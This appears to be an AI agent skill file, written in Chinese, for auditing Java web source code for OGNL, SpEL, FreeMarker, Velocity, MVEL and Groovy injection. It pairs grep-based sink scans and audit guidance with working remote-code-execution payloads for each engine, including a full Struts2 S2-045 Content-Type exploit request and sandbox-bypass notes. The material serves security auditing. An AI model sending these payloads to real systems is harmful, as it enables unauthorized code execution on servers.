---
name: java-expression-inject-audit
metadata:
  tags: [代码审计, java, 表达式注入, ssti, rce]
description: Java Web 源码表达式/模板注入漏洞审计工具。覆盖 OGNL（Struts2）、SpEL（Spring）、MVEL、EL 表达式、Velocity/FreeMarker 模板注入。适用于：(1) 识别表达式和模板引擎使用，(2) 检测表达式注入漏洞，(3) 审计 SSTI 风险，(4) 评估表达式注入 → RCE 利用链。**支持反编译 .class/.jar文件**。
---

# Java 表达式/模板注入漏洞审计工具

扫描 Java Web 项目源码，识别所有表达式求值和模板渲染入口，检测代码注入漏洞。

## 适用场景

适合 OGNL、SpEL、MVEL、EL、JEXL、Groovy、Velocity、FreeMarker 等引擎接收动态表达式或模板内容，需要判断控制面和执行边界。

## 不适用场景

请求数据进入固定模板变量不等于 SSTI，页面未转义首先属于 XSS。只有用户能控制表达式字符串、模板源码或可执行模板结构时，才进入表达式注入评估。

## 核心判断

关键链路是“用户控制表达式或模板语法 -> 引擎解析/求值 -> 可执行对象或敏感方法可达”。引擎版本、EvaluationContext、模板对象和沙箱决定输入是数据、受限表达式还是完整代码。

## 证据标准

- 可确认：表达式/模板控制证据、引擎执行入口和可观测执行结果证据闭合。
- 待验证：存在动态拼接或危险引擎，但输入控制、上下文能力、版本或沙箱条件尚未确认。
- 判为否：只控制模板变量、表达式来自固定配置、引擎只做数据绑定，或输出问题仅形成 XSS。

## 决策树

- 找到引擎入口：区分表达式解析、模板加载、模板变量和普通渲染。
- 判断控制面：确认用户能否改变表达式文本、模板内容或模板名。
- 检查上下文：核对 EvaluationContext、方法访问、类加载过滤和模板对象限制。
- 关联版本：把已知沙箱/CVE 作为候选条件，继续验证实际调用。
- 只有错误回显：证明错误来自表达式求值且具有安全影响。

## 常见误判

- 用户输入进入模板模型就认定模板注入。
- SpEL `parseExpression()` 存在就认为表达式字符串可控。
- 使用沙箱就认为完全安全，或只看版本不看 context 配置。
- 把模板输出未转义和模板语法执行混为同一漏洞。
- 用真实命令执行破坏性操作验证表达式能力。

---

## 检测范围

### 1. 表达式引擎全覆盖矩阵

> 完整引擎详解（OGNL/SpEL/MVEL/Groovy/JEXL/EL/ScriptEngine/Aviator/Janino）见 [EXPRESSION_ENGINES.md](references/EXPRESSION_ENGINES.md)

| 表达式引擎 | 框架上下文 | Sink 方法 | 危险等级 |
|:-----------|:----------|:----------|:---------|
| OGNL | Struts2 Action | `Ognl.getValue()`, `Ognl.parseExpression()`, `OgnlUtil.getValue()` | 🔴 |
| SpEL | Spring | `SpelExpressionParser.parseExpression()`, `@Value()`, `Expression.getValue()` | 🔴 |
| MVEL | Drools/Custom | `MVEL.eval()`, `MVEL.executeExpression()`, `MVEL.compileExpression()` | 🔴 |
| EL (JSP 2.0+) | JSP/Servlet | `ExpressionFactory.createValueExpression()`, `${...}` in JSP | 🟡 |
| JUEL | Custom | `ExpressionFactoryImpl.createValueExpression()` | 🟡 |
| JEXL | Apache Commons JEXL | `JexlEngine.createExpression()`, `Expression.evaluate()` | 🔴 |
| Groovy | Jenkins/Gradle | `GroovyShell.evaluate()`, `GroovyClassLoader.parseClass()` | 🔴 |
| Janino | Custom | `ExpressionEvaluator.evaluate()`, `ScriptEvaluator.evaluate()` | 🟡 |
| Aviator | Google Aviator | `AviatorEvaluator.execute()` | 🟡 |
| Rhino/Nashorn JS | Servlet | `ScriptEngine.eval()`, `Invocable.invokeFunction()` | 🔴 |

### 2. 模板引擎 SSTI 全覆盖矩阵

> 完整模板引擎 SSTI 详解（FreeMarker/Velocity/Thymeleaf/Groovy Templates/Pebble/Jade4j/Mustache/Beetl）见 [TEMPLATE_ENGINES.md](references/TEMPLATE_ENGINES.md)

| 模板引擎 | 框架上下文 | Sink 方法 | 危险等级 |
|:---------|:----------|:----------|:---------|
| Velocity | Apache Velocity | `Velocity.evaluate()`, `Velocity.mergeTemplate()`, `RuntimeServices.evaluate()` | 🔴 |
| FreeMarker | Spring Boot | `Template.process()`, `Configuration.getTemplate()`, `<#assign>` 注入 | 🔴 |
| Thymeleaf | Spring Boot | `TemplateEngine.process()`, `SpringTemplateEngine.process()` | 🟡 |
| Groovy Templates | Groovy | `SimpleTemplateEngine.createTemplate()`, `GStringTemplateEngine` | 🔴 |
| Pebble | Spring Boot | `PebbleTemplate.evaluate()`, `PebbleEngine.getTemplate()` | 🟡 |
| Jade4j | Custom | `JadeConfiguration.renderTemplate()` | 🟡 |
| Mustache | Spring Boot | `MustacheFactory.compile()`, `Mustache.execute()` | 🟢 |

---

## 工作流程

### 1. 表达式/模板引擎依赖扫描

```bash
# 扫描表达式引擎依赖
find {source_path} -name "*.jar" | grep -iE "ognl|spring-expression|mvel|groovy|jexl|janino|aviator|juel"

# 扫描模板引擎依赖
find {source_path} -name "*.jar" | grep -iE "velocity|freemarker|thymeleaf|pebble|jade4j|mustache"

# pom.xml 依赖扫描
grep -rnE "ognl|spring-expression|mvel2|groovy-all|commons-jexl|janino" {source_path}/pom.xml 2>/dev/null
```

### 2. 表达式注入 Sink 扫描

```bash
# OGNL (Struts2 核心)
grep -rnE "Ognl\.(getValue|setValue|parseExpression)|TextParseUtil\.translateVariables|OgnlUtil" --include="*.java"
grep -rnE "\$\{|%\{" --include="*.java" | grep -v "test\|Test"

# SpEL (Spring)
grep -rnE "SpelExpressionParser|parseExpression\(|ExpressionParser|@Value\(\"#\{|StandardEvaluationContext" --include="*.java"

# MVEL
grep -rnE "MVEL\.(eval|executeExpression|compileExpression)" --include="*.java"

# EL / JUEL
grep -rnE "createValueExpression|createMethodExpression|ELProcessor\.(eval|setValue)" --include="*.java"

# Groovy Shell
grep -rnE "GroovyShell|GroovyClassLoader|GroovyScriptEngine|evaluate\(|parseClass\(|new GroovyShell" --include="*.java"

# JEXL
grep -rnE "JexlEngine|JexlBuilder|createExpression|evaluate\(" --include="*.java"

# ScriptEngine (JavaScript Nashorn/Rhino)
grep -rnE "ScriptEngineManager|ScriptEngine|\.eval\(|Invocable\.invoke" --include="*.java"
```

### 3. 模板注入 Sink 扫描

```bash
# Velocity
grep -rnE "Velocity\.(evaluate|mergeTemplate)|VelocityContext|VelocityEngine\.evaluate" --include="*.java"

# FreeMarker
grep -rnE "Template\.process|Configuration\.getTemplate|FreeMarkerTemplateUtils|new Template\(|\.process\(" --include="*.java"

# Thymeleaf
grep -rnE "TemplateEngine\.process|SpringTemplateEngine|th:fragment|th:text|th:utext" --include="*.java"

# Groovy Template
grep -rnE "SimpleTemplateEngine|GStringTemplateEngine|XmlTemplateEngine|createTemplate" --include="*.java"
```

### 4. 各引擎关键利用技术

> 完整沙箱绕过技术（OGNL 演进史 2007-2021、SpEL 无沙箱利用、FreeMarker 5 层沙箱绕过、ScriptEngine/ClassFilter 绕过）见 [SANDBOX_BYPASS.md](references/SANDBOX_BYPASS.md)

#### 4.1 OGNL 注入（Struts2）

```
触发点: ${...} 或 %{...} 在 URL/参数/HTTP Header 中

经典 Payload:
${#_memberAccess.allowStaticMethodAccess=true,
  @java.lang.Runtime@getRuntime().exec('id')}

S2-045 Payload (Content-Type 注入):
%{(#nike='multipart/form-data')...

Struts2 版本与绕过:
├── ≤ 2.3.34: _memberAccess.allowStaticMethodAccess=true
├── 2.3.34+: _memberAccess.excludedClasses 绕过
├── ≥ 2.5.20: excludedClasses/excludedPackageNames 联合绕过
└── ≥ 2.5.26: 沙箱强化，需新 gadget 链
```

#### 4.2 SpEL 注入（Spring）

```
触发点: 用户输入传入 parseExpression() / @Value 注解

经典 Payload:
T(java.lang.Runtime).getRuntime().exec('id')

Spring Boot Thymeleaf SSTI:
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

Spring Cloud Gateway (CVE-2022-22947):
通过 Actuator 添加 route → SpEL 注入
```

#### 4.3 FreeMarker SSTI

```
模板注入入口: 用户可控的模板变量名或值

Payload (FreeMarker 2.3.x):
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

Payload (FreeMarker 2.3.31+ ObjectConstructor 被禁用):
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}

Freemarker 版本沙箱:
├── ≤ 2.3.30: Execute?new() 直接可用
├── 2.3.31+: Execute 移除，ObjectConstructor 绕过
└── ≥ 2.3.32: ObjectConstructor 也移除，需新链
```

#### 4.4 Velocity SSTI

```
#set($x='') $x.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')
```

#### 4.5 MVEL 注入

```
Runtime.getRuntime().exec('id')

// MVEL 2.x 更安全，1.x 更危险
MVEL.eval("Runtime.getRuntime().exec('id')")
```

#### 4.6 Groovy 注入

```
GroovyShell shell = new GroovyShell();
shell.evaluate(userInput);  // ← 直接可执行任意 Groovy 代码

// Payload:
"id".execute()
def process = "id".execute()
```

---

### 5. 利用条件速查表

| 引擎 | 参数可控性要求 | 无鉴权风险 | 有鉴权风险 | RCE 难度 |
|:-----|:-------------|:----------|:----------|:---------|
| OGNL | ⚠️ 部分可控即可（URL/Header/Param） | 🔴 | 🟡 | 低（工具链成熟） |
| SpEL | ✅ 可控表达式字符串 | 🔴 | 🟡 | 低 |
| Groovy | ✅ 可控脚本字符串 | 🔴 | 🟡 | 低 |
| MVEL 1.x | ✅ 可控表达式字符串 | 🔴 | 🟡 | 低 |
| FreeMarker | ✅ 可控模板变量 | 🔴 | 🟡 | 低（有公开 bypass） |
| Velocity | ✅ 可控模板内容 | 🔴 | 🟡 | 低 |
| JEXL | ✅ 可控表达式字符串 | 🔴 | 🟡 | 低 |
| Thymeleaf | ⚠️ 需要特定表达式前缀 `__${...}__` | 🔴 | 🟡 | 中 |

---

### 6. 输出模板

```markdown
# Java 表达式/模板注入漏洞审计报告

## 📊 扫描概览

| 指标 | 数量 |
|:-----|:-----|
| 表达式引擎使用点 | X |
| 模板引擎使用点 | Y |
| 参数可控 + 无鉴权 | Z |

## 🔴 高危风险详情

### [C-EXPR-001] Struts2 OGNL 表达式注入 (S2-045)

- **位置**: `FileUploadInterceptor.java` (Struts2 框架内置)
- **引擎类型**: OGNL
- **框架**: Struts2 2.3.32
- **版本漏洞**: S2-045 (CVE-2017-5638)
- **触发方式**: 任意请求的 `Content-Type` 头
- **鉴权状态**: ❌ 无鉴权（可未认证触发）
- **PoC**:

```http
POST /any/action HTTP/1.1
Content-Type: %{(#_memberAccess.allowStaticMethodAccess=true).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

GET /any HTTP/1.1
```

- **修复建议**: 升级 Struts2 ≥ 2.5.26

---

### [H-EXPR-002] FreeMarker SSTI

- **位置**: `ReportController.generate() (ReportController.java:89)`
- **引擎类型**: FreeMarker 2.3.28
- **触发方式**: POST `/api/report/generate` → `@RequestBody templateData`
- **鉴权状态**: ❌ 无鉴权
- **注入点**: `templateData.reportName` 被拼入模板
- **Payload**:

```http
POST /api/report/generate HTTP/1.1
Content-Type: application/json

{"reportName": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"}
```

- **修复建议**: 禁止用户数据拼入模板内容，使用沙箱 TemplateModel
```

---

## 反编译阶段（CRITICAL）

**当源码不可用时，按运行环境中可用的反编译能力处理表达式/模板引擎相关类。**

详细策略参见 [DECOMPILE_STRATEGY.md](references/DECOMPILE_STRATEGY.md)

可使用运行环境中可用的反编译工具。内置 `java_decompile`、CFR、`javap` 等均可作为候选，按实际能力和结果选择。

---

## 参考资料

| 文档 | 用途 | 何时加载 |
|------|------|---------|
| [EXPRESSION_ENGINES.md](references/EXPRESSION_ENGINES.md) | 10 种表达式引擎详解 + Payload + CVE 速查 | 识别表达式引擎时参考 |
| [TEMPLATE_ENGINES.md](references/TEMPLATE_ENGINES.md) | 7 种模板引擎 SSTI 详解 + 沙箱配置 + 判定矩阵 | 识别模板引擎时参考 |
| [SANDBOX_BYPASS.md](references/SANDBOX_BYPASS.md) | 各引擎沙箱绕过矩阵 + 绕过技巧 + 实战案例 | 评估沙箱绕过可行性时必读 |
| [OUTPUT_TEMPLATE.md](references/OUTPUT_TEMPLATE.md) | 填充式输出报告模板 | 生成最终报告时严格对照 |
| [DECOMPILE_STRATEGY.md](references/DECOMPILE_STRATEGY.md) | 反编译策略 + 表达式/模板类定位指南 | 源码不可用时必读 |
